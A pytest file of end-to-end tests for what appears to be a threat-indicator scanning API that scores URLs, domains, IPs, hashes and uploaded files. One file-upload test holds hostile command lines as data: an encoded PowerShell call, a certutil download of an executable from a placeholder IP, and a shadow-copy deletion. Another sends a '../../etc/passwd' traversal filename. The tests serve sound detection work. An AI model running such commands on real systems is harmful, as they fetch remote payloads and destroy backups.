"""End-to-end API behaviour through the real ASGI app."""

from __future__ import annotations

import hashlib
import io

import pytest

EICAR_SHA256 = "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"


class TestSystemEndpoints:
    def test_health_reports_a_live_database(self, client):
        body = client.get("/api/health").json()
        assert body["status"] == "ok"
        # Health names the backend in use, so a deployment pointed at the wrong
        # database is visible without shell access.
        assert body["database"].startswith("connected")
        assert "sqlite" in body["database"]
        assert any(p["name"] == "local" for p in body["providers"])

    def test_openapi_schema_is_served(self, client):
        schema = client.get("/openapi.json")
        assert schema.status_code == 200
        assert "/api/analyze/url" in schema.json()["paths"]

    def test_swagger_docs_render(self, client):
        response = client.get("/docs")
        assert response.status_code == 200
        assert "swagger" in response.text.lower()

    def test_config_endpoint_never_leaks_secrets(self, client):
        body = client.get("/api/config").json()
        assert body["risk_bands"][0]["verdict"] == "clean"
        serialised = str(body).lower()
        assert "api_key" not in serialised and "virustotal_api" not in serialised

    def test_security_headers_are_applied(self, client):
        headers = client.get("/api/health").headers
        assert headers["x-content-type-options"] == "nosniff"
        assert headers["x-frame-options"] == "DENY"


class TestURLEndpoint:
    def test_successful_submission_returns_a_full_report(self, client):
        response = client.post("/api/analyze/url", json={"url": "https://example.com/about"})
        assert response.status_code == 201
        body = response.json()
        assert body["reference"].startswith("SC-")
        assert body["indicator_type"] == "url"
        assert body["verdict"] == "clean"
        assert body["findings"]
        assert body["details"]["scoring"]["score"] == body["risk_score"]

    def test_phishing_url_scores_into_a_higher_band(self, client):
        body = client.post(
            "/api/analyze/url",
            json={"url": "http://paypal.secure.login.account-verify.xyz/webscr/confirm.php"},
        ).json()
        assert body["risk_score"] >= 50
        assert body["verdict"] in ("suspicious", "high_risk", "critical")

    def test_every_scored_finding_appears_in_the_breakdown(self, client):
        body = client.post(
            "/api/analyze/url", json={"url": "http://198.51.100.23:8081/invoice.pdf.exe"}
        ).json()
        scored = {f["code"] for f in body["findings"] if f["points"] > 0}
        explained = {b["code"] for b in body["details"]["scoring"]["breakdown"]}
        assert scored == explained

    def test_invalid_url_returns_422_with_a_useful_message(self, client):
        response = client.post("/api/analyze/url", json={"url": "ftp://example.com/x"})
        assert response.status_code == 422
        assert "scheme" in response.json()["error"]["message"].lower()

    def test_missing_field_returns_422(self, client):
        response = client.post("/api/analyze/url", json={})
        assert response.status_code == 422
        assert response.json()["error"]["code"] == "validation_error"

    def test_empty_body_returns_422(self, client):
        assert client.post("/api/analyze/url", json={"url": ""}).status_code == 422

    def test_response_never_contains_a_stack_trace(self, client):
        response = client.post("/api/analyze/url", json={"url": "!!!"})
        assert "Traceback" not in response.text


class TestOtherIndicatorEndpoints:
    def test_domain_submission(self, client):
        body = client.post("/api/analyze/domain", json={"domain": "example.com"}).json()
        assert body["indicator_type"] == "domain"
        assert body["indicator"] == "example.com"

    def test_domain_rejects_a_full_url(self, client):
        assert client.post("/api/analyze/domain", json={"domain": "https://example.com/x"}).status_code == 422

    def test_ip_submission(self, client):
        body = client.post("/api/analyze/ip", json={"ip": "203.0.113.66"}).json()
        assert body["indicator_type"] == "ip"
        # The local provider carries a synthetic record for this TEST-NET address.
        assert any(p["result"] == "malicious" for p in body["provider_results"])

    def test_ip_rejects_a_hostname(self, client):
        assert client.post("/api/analyze/ip", json={"ip": "example.com"}).status_code == 422

    def test_hash_submission_identifies_the_algorithm(self, client):
        body = client.post("/api/analyze/hash", json={"hash": EICAR_SHA256}).json()
        assert body["details"]["algorithm"] == "SHA-256"

    def test_positively_identified_hash_reaches_high_risk_via_the_score_floor(self, client):
        body = client.post("/api/analyze/hash", json={"hash": EICAR_SHA256}).json()
        assert body["verdict"] in ("high_risk", "critical")
        assert body["details"]["scoring"]["floor_applied"] == 70
        assert any(p["result"] == "malicious" for p in body["provider_results"])

    def test_unknown_hash_stays_clean(self, client):
        body = client.post(
            "/api/analyze/hash",
            json={"hash": "3b8f2c1a9d7e4f6b0c5a8e2d1f7b4c9a6e3d0f8b2c5a7e1d4f9b6c3a0e8d2f5b"},
        ).json()
        assert body["verdict"] == "clean"
        assert body["risk_score"] == 0

    def test_hash_rejects_a_bad_length(self, client):
        assert client.post("/api/analyze/hash", json={"hash": "abc123"}).status_code == 422


class TestFileEndpoint:
    def test_upload_returns_all_three_digests(self, client):
        content = b"harmless notes for the file upload test\n"
        response = client.post(
            "/api/analyze/file", files={"file": ("notes.txt", io.BytesIO(content), "text/plain")}
        )
        assert response.status_code == 201
        body = response.json()
        assert body["details"]["hashes"]["sha256"] == hashlib.sha256(content).hexdigest()
        assert body["indicator_type"] == "file"

    def test_upload_filename_is_sanitised_in_the_report(self, client):
        response = client.post(
            "/api/analyze/file",
            files={"file": ("../../etc/passwd", io.BytesIO(b"root:x:0:0:\n"), "text/plain")},
        )
        assert "/" not in response.json()["indicator_display"]

    def test_suspicious_script_upload_is_scored_and_mapped_to_attack(self, client):
        content = (
            b"powershell -EncodedCommand SQBFAFgA\n"
            b"certutil -urlcache -split -f http://198.51.100.23/x.exe\n"
            b"vssadmin delete shadows /all /quiet\n"
        )
        body = client.post(
            "/api/analyze/file", files={"file": ("dropper.bat", io.BytesIO(content), "text/plain")}
        ).json()
        assert body["risk_score"] >= 70
        assert body["mitre_techniques"]
        assert all(t["confidence"] == "potential association" for t in body["mitre_techniques"])

    def test_oversized_upload_is_rejected_with_413(self, client, monkeypatch):
        from app.core import config

        monkeypatch.setattr(config.settings, "max_upload_bytes", 1024)
        response = client.post(
            "/api/analyze/file",
            files={"file": ("big.bin", io.BytesIO(b"X" * 20_000), "application/octet-stream")},
        )
        assert response.status_code == 413
        assert response.json()["error"]["code"] == "payload_too_large"

    def test_missing_file_field_returns_422(self, client):
        assert client.post("/api/analyze/file").status_code == 422

    def test_uploaded_bytes_are_not_retained(self, client):
        from app.services import storage

        client.post(
            "/api/analyze/file", files={"file": ("x.txt", io.BytesIO(b"transient bytes"), "text/plain")}
        )
        assert list(storage.quarantine_root().iterdir()) == []


class TestHistoryEndpoints:
    @pytest.fixture
    def seeded(self, client):
        client.post("/api/analyze/url", json={"url": "https://example.com/one"})
        client.post("/api/analyze/domain", json={"domain": "freestuff.xyz"})
        client.post("/api/analyze/ip", json={"ip": "203.0.113.66"})
        return client

    def test_listing_is_paginated(self, seeded):
        body = seeded.get("/api/analyses", params={"page": 1, "page_size": 2}).json()
        assert len(body["items"]) == 2
        assert body["total"] == 3
        assert body["total_pages"] == 2

    def test_filtering_by_indicator_type(self, seeded):
        body = seeded.get("/api/analyses", params={"indicator_type": "domain"}).json()
        assert body["total"] == 1
        assert body["items"][0]["indicator_type"] == "domain"

    def test_search_matches_the_indicator(self, seeded):
        body = seeded.get("/api/analyses", params={"search": "freestuff"}).json()
        assert body["total"] == 1

    def test_search_matches_the_reference(self, seeded):
        reference = seeded.get("/api/analyses").json()["items"][0]["reference"]
        assert seeded.get("/api/analyses", params={"search": reference}).json()["total"] == 1

    def test_sorting_by_risk_score(self, seeded):
        items = seeded.get(
            "/api/analyses", params={"sort_by": "risk_score", "sort_dir": "desc"}
        ).json()["items"]
        scores = [i["risk_score"] for i in items]
        assert scores == sorted(scores, reverse=True)

    def test_score_range_filter(self, seeded):
        body = seeded.get("/api/analyses", params={"min_score": 1}).json()
        assert all(i["risk_score"] >= 1 for i in body["items"])

    def test_report_is_retrievable_by_reference_and_by_id(self, seeded):
        summary = seeded.get("/api/analyses").json()["items"][0]
        by_reference = seeded.get(f"/api/analyses/{summary['reference']}")
        by_id = seeded.get(f"/api/analyses/{summary['id']}")
        assert by_reference.status_code == by_id.status_code == 200
        assert by_reference.json()["id"] == by_id.json()["id"]

    def test_unknown_identifier_returns_404(self, client):
        response = client.get("/api/analyses/SC-NOPE99")
        assert response.status_code == 404
        assert response.json()["error"]["code"] == "not_found"

    def test_deletion_removes_the_record(self, seeded):
        reference = seeded.get("/api/analyses").json()["items"][0]["reference"]
        assert seeded.delete(f"/api/analyses/{reference}").json() == {
            "deleted": True,
            "reference": reference,
        }
        assert seeded.get(f"/api/analyses/{reference}").status_code == 404

    def test_deleting_a_missing_record_returns_404(self, client):
        assert client.delete("/api/analyses/SC-MISSING").status_code == 404


class TestDashboardStats:
    def test_stats_are_derived_from_stored_rows(self, client):
        assert client.get("/api/stats/dashboard").json()["total_analyses"] == 0

        client.post("/api/analyze/url", json={"url": "https://example.com/a"})
        client.post(
            "/api/analyze/url",
            json={"url": "http://paypal.secure.login.account-verify.xyz/webscr/confirm.php"},
        )

        body = client.get("/api/stats/dashboard").json()
        assert body["total_analyses"] == 2
        assert body["by_indicator_type"]["url"] == 2
        assert sum(body["by_verdict"].values()) == 2
        assert len(body["recent"]) == 2

    def test_activity_series_is_zero_filled_to_the_requested_length(self, client):
        body = client.get("/api/stats/dashboard", params={"activity_days": 7}).json()
        assert len(body["activity"]) == 7
        assert all("date" in point and "count" in point for point in body["activity"])

    def test_headline_counters_partition_the_verdict_bands(self, client):
        client.post("/api/analyze/url", json={"url": "https://example.com/a"})
        body = client.get("/api/stats/dashboard").json()
        assert (
            body["malicious_count"] + body["suspicious_count"] + body["clean_count"]
            == body["total_analyses"]
        )
